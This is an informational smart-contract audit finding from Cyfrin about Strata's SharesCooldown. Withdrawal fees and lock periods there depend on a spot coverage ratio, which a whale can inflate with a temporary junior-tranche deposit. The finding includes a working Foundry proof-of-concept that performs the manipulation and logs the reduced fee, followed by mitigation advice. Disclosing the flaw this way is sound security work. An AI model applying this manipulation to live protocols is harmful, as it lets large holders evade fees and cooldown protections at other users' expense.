---
affected_contracts: []
derives_from: []
id: solodit-cyfrin-2026-01-23-cyfrin-strata-shares-cooldown-v2-0-2-4
ingested_at: '2026-07-26T07:14:09Z'
protocol_category: []
published_at: '2026-01-23T00:00:00Z'
related_swc: []
severity: Informational
source: solodit
source_url: https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2026-01-23-cyfrin-strata-shares-cooldown-v2.0.md
tags:
- firm:cyfrin
- report:2026-01-23-cyfrin-strata-shares-cooldown-v2-0
title: Coverage manipulation enables whale to consistently obtain best exit terms
  for withdrawals
vuln_class: []
---

# Coverage manipulation enables whale to consistently obtain best exit terms for withdrawals

_Section severity (from Solodit section header): Informational_  
_Audit firm: Cyfrin_  
_Source report: [2026-01-23-cyfrin-strata-shares-cooldown-v2.0.md](https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2026-01-23-cyfrin-strata-shares-cooldown-v2.0.md)_

---

**Description:** Exit parameters for `SharesCooldown` (fee and sharesLock) are selected based on the current `coverage()` value in `StrataCDO`. Coverage is computed from unlocked tranche TVLs, i.e. `(jrtNav - lockedJrt) / (srtNav - lockedSrt)`, and is evaluated at the time of requesting the withdrawing.

```solidity
    function totalAssetsUnlocked() public view returns (uint256 jrtNav, uint256 srtNav) {
        (jrtNav, srtNav, ) = accounting.totalAssetsT0(); // получаем весь TVL

        uint256 jrtNavLocked = jrtVault.convertToAssets(jrtVault.balanceOf(address(sharesCooldown)));
        uint256 srtNavLocked = srtVault.convertToAssets(srtVault.balanceOf(address(sharesCooldown)));

        jrtNav = jrtNav > jrtNavLocked ? jrtNav - jrtNavLocked : 0;
        srtNav = srtNav > srtNavLocked ? srtNav - srtNavLocked : 0;
        return (jrtNav, srtNav);
    }

    function coverage () public view returns (uint32 coverage) {
        (uint256 jrtNav, uint256 srtNav) = totalAssetsUnlocked();
        if (srtNav == 0) {
            return type(uint32).max;
        }
        uint256 coverage = jrtNav * 1e6 / srtNav; //
        return coverage > type(uint32).max ? type(uint32).max : uint32(coverage);
    }
```
Because coverage is a spot value and depends directly on tranche TVLs, a large depositor can temporarily increase `jrtNav` (via a large JRT deposit) right before initiating an redemption to push coverage into a more favorable band, obtain reduced fee / reduced cooldown (potentially no lock), and then unwind the temporary JRT position after the SRT redemption. This works especially well for SRT exits because the attacker benefits from (1) increasing `jrtNav` first to improve coverage, and (2) reducing `srtNav` via their own SRT withdrawal, which keeps coverage favorable for immediately exiting the temporary JRT position as well.

PoC demonstrates this with the reference spec bounds:

1. Starting state: `jrtNav = 10,000`, `srtNav = 100,000` (coverage = 10%), which normally places SRT exits into a worse band (e.g., r1: 0.7% fee + 7h lock).

2. Whale deposits `30,001` into JRT, pushing coverage to ~40% and reaching the best SRT band (r2: 0.15% fee, no lock).

3. Whale redeems 40,000 from SRT immediately under r2 terms.

4. Whale redeems the temporary JRT deposit after, and finalizes the underlying UnstakeCooldown later.

5. The logged output shows the whale pays materially less than the baseline fee they would pay without manipulating coverage (and avoids the intended lockup / reduced waiting time).

Normal fee that whale could pay is 40,000 * 0.7% = 280 USDE.
But whale will pay is only ~137 USDe.

This is not limited to “best band” outcomes: even partial coverage improvements allow the whale to pay meaningfully lower fees and/or reduce wait time (e.g., “7 days → 1 day”, “0.7% → 0.15%”), making the mechanism systematically gameable by accounts with large balances. If the best band for any vault ever has `sharesLock == 0`, then any actor with access to cheap/flash liquidity can temporarily move coverage to that band and exit immediately.

**Impact:** A whale can bypass intended coverage-based protections for SRT exits by temporarily inflating coverage, resulting in:

1. Reduced protocol fee capture (systematically lower exit fees than intended for large exits).

2. Cooldown bypass / shortened waiting period (including “no lock” if configured).

**Proof of Concept:** Paste this file to `Poc/Cyfrin`
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import { CDOTest } from "../../CDO.t.sol";
import { IStrataCDO } from "../../../contracts/tranches/interfaces/IStrataCDO.sol";
import { IUnstakeHandler } from "../../../contracts/tranches/interfaces/cooldown/IUnstakeHandler.sol";
import { ERC4626 } from "@openzeppelin/contracts/token/ERC20/extensions/ERC4626.sol";
import {console} from "forge-std/console.sol";
import {SharesCooldown} from "../../../contracts/tranches/base/cooldown/SharesCooldown.sol";
import {AccessControlled} from "../../../contracts/governance/AccessControlled.sol";
import {ISharesCooldown} from "../../../contracts/tranches/interfaces/cooldown/ISharesCooldown.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import { CooldownBase } from "../../../contracts/tranches/base/cooldown/CooldownBase.sol";
import { UnstakeCooldown } from "../../../contracts/tranches/base/cooldown/UnstakeCooldown.sol";
import { ICooldown } from "../../../contracts/tranches/interfaces/cooldown/ICooldown.sol";


contract JrtSrtRatioViolationTest is CDOTest {

    function test_coverage_manipulation() public {
        address whale = address(0x1234);
        address owner = cdo.owner();
        vm.startPrank(owner);
        SharesCooldown sharesCooldown = SharesCooldown(
            address(
                new ERC1967Proxy(
                    address(new SharesCooldown()),
                    abi.encodeWithSelector(CooldownBase.initialize.selector, owner, address(acm))
                )
            )
        );
        AccessControlled(sharesCooldown).setTwoStepConfigManager(owner);
        acm.grantRole(keccak256("COOLDOWN_WORKER_ROLE"), address(cdo));
        // 2. Register sharesCooldown in CDO
        cdo.setSharesCooldown(ISharesCooldown(address(sharesCooldown)));


        // Set up real spec exit bands per reference
        SharesCooldown.TExitUpperBounds memory jrtExitBounds = ISharesCooldown.TExitUpperBounds({
            p0: 5000,     // 0.5% (in ppm)
            p1: 23000,    // 2.3% (in ppm)
            r0: ISharesCooldown.TExitParams({ feePpm: 10000, sharesLock: 2 days }),   // 1% fee + 2 days lock
            r1: ISharesCooldown.TExitParams({ feePpm: 5000, sharesLock: 8 hours }),   // 0.5% fee + 8h lock
            r2: ISharesCooldown.TExitParams({ feePpm: 300, sharesLock: 0 })           // 0.03% fee, no lock
        });
        SharesCooldown.TExitUpperBounds memory srtExitBounds = ISharesCooldown.TExitUpperBounds({
            p0: 20000,     // 2% (in ppm)
            p1: 400000,    // 40% (in ppm)
            r0: ISharesCooldown.TExitParams({ feePpm: 10000, sharesLock: 3 days }),   // 1% fee + 3 days lock
            r1: ISharesCooldown.TExitParams({ feePpm: 7000, sharesLock: 7 hours }),   // 0.7% fee + 7h lock
            r2: ISharesCooldown.TExitParams({ feePpm: 1500, sharesLock: 0 })          // 0.15% fee, no lock
        });
        sharesCooldown.setVaultExitBounds(address(jrtVault), jrtExitBounds);
        sharesCooldown.setVaultExitBounds(address(srtVault), srtExitBounds);

        // Scenario setup
        // Initial state:
        //   JRT unlocked = 10,000
        //   SRT unlocked = 100,000
        //   Coverage = 10%

        // Bootstrap the JRT/SRT pools to have JRT=10_000, SRT=100_000
        address bootstrapper = address(0xdeadbeef);
        USDe.mint(bootstrapper, 10000 ether);
        USDe.mint(bootstrapper, 60000 ether);
        vm.startPrank(bootstrapper);
        USDe.approve(address(jrtVault), 10000 ether);
        jrtVault.deposit(10000 ether, bootstrapper);
        USDe.approve(address(srtVault), 60000 ether);
        srtVault.deposit(60000 ether, bootstrapper);
        vm.stopPrank();

        USDe.mint(whale, 80001 ether);
        // Whale's initial SRT deposit for withdrawal
        vm.startPrank(whale);
        USDe.approve(address(srtVault), 40000 ether);
        srtVault.deposit(40000 ether, whale); // initially not deposited yet, to start at 100k (see below)
        vm.stopPrank();

        // Now SRT = 40,000 + 60,000 = 100,000
        //    JRT = 10,000

        // Whale wants to withdraw 30,000 SRT (would normally hit 0.7% fee + 7h lock)

        // Step 1: Whale makes a huge deposit into JRT to manipulate coverage
        vm.startPrank(whale);

        USDe.approve(address(jrtVault), 30001 ether);
        jrtVault.deposit(30001 ether, whale);

        // After this JRT = 10,000 + 30,001 = 40,001
        // SRT still 100,000

        // Coverage = 40,001 / 100,000 = 40.001% (triggers SRT fee/lock lowering to r2)

        // Step 2: Whale immediately withdraws 30,000 SRT at lowest fee, no cooldown
        // Step 2: Whale immediately redeems SRT to receive 30000 assets before fees (fee will apply on top)
        uint256 srtAssetsToReceive = 40000 ether;
        uint256 srtSharesToRedeem = srtVault.previewRedeem(srtAssetsToReceive);
        srtVault.redeem(srtSharesToRedeem, whale, whale);

        // Step 3: Whale redeems temporary JRT to receive 29991 assets before fees (fee will apply on top)
        uint256 jrtAssetsToReceive = 30001 ether;
        uint256 jrtSharesToRedeem = jrtVault.previewRedeem(jrtAssetsToReceive);
        jrtVault.redeem(jrtSharesToRedeem, whale, whale);


        uint256 whaleBalanceBefore = USDe.balanceOf(whale);
        vm.warp(block.timestamp + 7 days); // wait because SharesCooldown redeem automatically withdraw on USDe and we need to wait UnstakeCooldown period.
        unstakeCooldown.finalize(sUSDe, whale);
        uint256 whaleBalanceAfter = USDe.balanceOf(whale);
        uint256 whaleReceived = whaleBalanceAfter - whaleBalanceBefore;
        console.log("Received: ", whaleReceived);
        uint256 fee = 70001 * 1e18 - whaleReceived;
        console.log("Fee: ", fee); // Fee is ~137 USDe, while we will pay 280 USDe in normal scenario
        vm.stopPrank();

    }
}
```

**Recommended Mitigation:** When defining the `TExitUpperBounds` on the `SharesCooldown`, take into consideration the following two recommendations:
- Define fees for the different coverage ranges, such as the cost of round-tripping JRT and SRT across bands, is neutralized (e.g., `jrt.r2.fee + srt.r2.fee ≥ srt.r1.fee`, and similarly for other bands).
- Implement a minimum lock-up period for the R2 band to further disincentivize manipulation of the coverage percentage by instant deposit and withdrawals on the Junior Tranche.

Ideally, refactor the `TwoStepConfigManager::validateBounds` function to have clear ranges for fees and sharesLock depending on the coverage range, minimum and maximum for each value within their range.

**Strata:** Acknowledged.  The `coverage boundaries` are not strict invariants that must be preserved.
